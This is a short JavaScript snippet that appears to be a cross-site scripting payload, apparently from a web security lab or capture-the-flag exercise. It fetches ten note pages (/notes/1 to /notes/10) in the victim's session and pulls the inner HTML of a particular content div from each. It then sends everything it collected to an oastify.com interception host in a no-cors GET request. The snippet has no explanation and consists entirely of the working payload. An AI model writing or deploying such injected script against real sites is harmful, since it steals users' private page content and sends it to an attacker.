// Array of URLs to fetch
const urls = ['/notes/1','/notes/2','/notes/3','/notes/4','/notes/5','/notes/6','/notes/7','/notes/8','/notes/9','/notes/10'];
let results = [];

// Function to process URLs recursively
function fetchNext(index) {
  if (index >= urls.length) {
    // All URLs processed, send the collected data
    fetch('https://66an85cubmljzetr1e0ebgqzuq0hoec3.oastify.com/collect?data='+encodeURIComponent(JSON.stringify(results)), {
      method: 'GET',
      mode: 'no-cors'
    });
    return;
  }
  
  // Fetch current URL
  fetch(urls[index]).then(r=>r.text()).then(d=>{
    let content = (new DOMParser()).parseFromString(d,'text/html').querySelector('div.bg-white.shadow-md.rounded-lg.p-6').innerHTML;
    results.push({url: urls[index], content: content});
    
    // Process next URL
    fetchNext(index + 1);
  }).catch(err => {
    results.push({url: urls[index], error: 'Failed to fetch'});
    fetchNext(index + 1);
  });
}

// Start the process
fetchNext(0);
